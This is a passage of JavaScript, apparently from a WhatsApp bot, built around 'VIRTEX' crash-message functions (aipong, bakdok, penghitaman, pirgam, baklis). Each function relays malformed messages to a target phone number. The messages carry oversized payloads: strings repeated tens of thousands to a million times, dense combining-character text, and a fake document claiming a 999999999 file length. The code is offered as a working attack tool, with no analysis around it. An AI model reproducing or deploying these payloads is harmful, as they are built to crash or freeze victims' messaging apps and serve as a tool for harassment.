*ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̊̊̔̔̔̔̔̔ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰*˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕*







𝗗𝗮𝘀𝗮𝗿 
𝙂𝙄𝙏𝙐 𝘼𝙅𝘼 𝙋𝘼𝙉𝙄𝙆🗿
𝘽𝙐𝙆𝘼𝙉 𝙑𝙄𝙍𝙏𝙀𝙓 𝘼𝙎𝙇𝙄╮⭑ ☠️⃰͜͡؜《《   ֎ ⃢☠️☠️ 𝗩𝗜𝗥𝗧𝗘𝗫 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁴》》
_*██ 𝗩𝗜𝗥𝗧𝗘𝗫██*_ 
𖣘𝓜꙰⃢⃠⃠⃠⃠⃠*_🇲🇾⁘̨̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̽̈
*ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̊̊̔̔̔̔̔̔ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰*˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕*







𝗗𝗮𝘀𝗮𝗿 
𝙂𝙄𝙏𝙐 𝘼𝙅𝘼 𝙋𝘼𝙉𝙄𝙆🗿
𝘽𝙐𝙆𝘼𝙉 𝙑𝙄𝙍𝙏𝙀𝙓 𝘼𝙎𝙇𝙄🔥᜴▴《《   ֎ ⃢☠️☠️ 𝗩𝗜𝗥𝗧𝗘𝗫 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁴》》
_*██ 𝗩𝗜𝗥𝗧𝗘𝗫██*_ 
𖣘𝓜꙰⃢⃠⃠⃠⃠⃠*_🇲🇾⁘̨̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̽̈
*ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̊̊̔̔̔̔̔̔ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰*˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕*







𝗗𝗮𝘀𝗮𝗿 
𝙂𝙄𝙏𝙐 𝘼𝙅𝘼 𝙋𝘼𝙉𝙄𝙆🗿
𝘽𝙐𝙆𝘼𝙉 𝙑𝙄𝙍𝙏𝙀𝙓 𝘼𝙎𝙇𝙄😈⃟╮`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
       }
}), { userJid: target, quoted: kuwoted });
await zynxzo.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

//=================================================//
async function aipong(target) {
await zynxzo.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}
//=================================================//
async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
    "mimetype": "penis",
    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    "fileLength": "999999999",
    "pageCount": 999999999,
    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    "fileName": `✳️᜴࿆͆᷍《《   ֎ ⃢☠️☠️ 𝗩𝗜𝗥𝗧𝗘𝗫 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁴》》
_*██ 𝗩𝗜𝗥𝗧𝗘𝗫██*_ 
𖣘𝓜꙰⃢⃠⃠⃠⃠⃠*_🇲🇾⁘̨̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̽̈
*ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̊̊̔̔̔̔̔̔ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰*˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕*







𝗗𝗮𝘀𝗮𝗿 
𝙂𝙄𝙏𝙐 𝘼𝙅𝘼 𝙋𝘼𝙉𝙄𝙆🗿
𝘽𝙐𝙆𝘼𝙉 𝙑𝙄𝙍𝙏𝙀𝙓 𝘼𝙎𝙇𝙄╮⭑ ☠️⃰͜͡؜《《   ֎ ⃢☠️☠️ 𝗩𝗜𝗥𝗧𝗘𝗫 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁴》》
_*██ 𝗩𝗜𝗥𝗧𝗘𝗫██*_ 
𖣘𝓜꙰⃢⃠⃠⃠⃠⃠*_🇲🇾⁘̨̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̽̈
*ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̊̊̔̔̔̔̔̔ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰*˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕*







𝗗𝗮𝘀𝗮𝗿 
𝙂𝙄𝙏𝙐 𝘼𝙅𝘼 𝙋𝘼𝙉𝙄𝙆🗿
𝘽𝙐𝙆𝘼𝙉 𝙑𝙄𝙍𝙏𝙀𝙓 𝘼𝙎𝙇𝙄🔥᜴▴《《   ֎ ⃢☠️☠️ 𝗩𝗜𝗥𝗧𝗘𝗫 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁴》》
_*██ 𝗩𝗜𝗥𝗧𝗘𝗫██*_ 
𖣘𝓜꙰⃢⃠⃠⃠⃠⃠*_🇲🇾⁘̨̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̽̈
*ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̊̊̔̔̔̔̔̔ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰*˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕*







𝗗𝗮𝘀𝗮𝗿 
𝙂𝙄𝙏𝙐 𝘼𝙅𝘼 𝙋𝘼𝙉𝙄𝙆🗿
𝘽𝙐𝙆𝘼𝙉 𝙑𝙄𝙍𝙏𝙀𝙓 𝘼𝙎𝙇𝙄🔥🔥⃟╮.xp`+"ྦྷ".repeat(60000),
    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1715880173"
  }
}), { userJid: target, quoted: kuwoted });
await zynxzo.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function penghitaman(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await zynxzo.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function pirgam(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "🩸⃟༑⌁⃰《《   ֎ ⃢☠️☠️ 𝗩𝗜𝗥𝗧𝗘𝗫 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁴》》Ꮤ𐋅𐌀𐌕𐌔𐌀𐌓𐌓 ᭢ꫀ᭙ཀ͜͡🦠",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "http://telegra.ph/file/d3993006a1431ef2aa9b9.jpg" } }, { upload: zynxzo.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #《《   ֎ ⃢☠️☠️ 𝗩𝗜𝗥𝗧𝗘𝗫 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁴》》"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await zynxzo.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function baklis(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "⟠ 《《   ֎ ⃢☠️☠️ 𝗩𝗜𝗥𝗧𝗘𝗫 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁴》》"+" ".repeat(920000),
        'footerText': `✳️᜴࿆͆᷍《《   ֎ ⃢☠️☠️ 𝗩𝗜𝗥𝗧𝗘𝗫 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁴》》
_*██ 𝗩𝗜𝗥𝗧𝗘𝗫██*_ 
𖣘𝓜꙰⃢⃠⃠⃠⃠⃠*_🇲🇾⁘̨̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̽̈
